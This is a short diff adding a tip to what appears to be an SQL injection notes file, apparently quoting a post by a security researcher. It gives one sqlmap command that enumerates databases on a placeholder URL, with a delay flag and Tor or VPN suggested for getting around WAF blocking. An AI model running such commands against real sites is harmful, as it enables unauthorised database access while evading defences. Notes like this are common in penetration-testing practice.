@@ -1,6 +1,20 @@
 SQL
 ====
 
+
+
+
+
+
+If you found a syntax error but are stuck with server delay and waf block, be sure to use --delay (with Tor or VPN) so you can solve the problem 🥳🤗
+
+sqlmap -u 'https :// domain[.]X/blablabla.php?kID=1%27' -p parameter --dbs --delay=3
+
+
+
+
+
+
 N$
 @nav1n0x
 ·
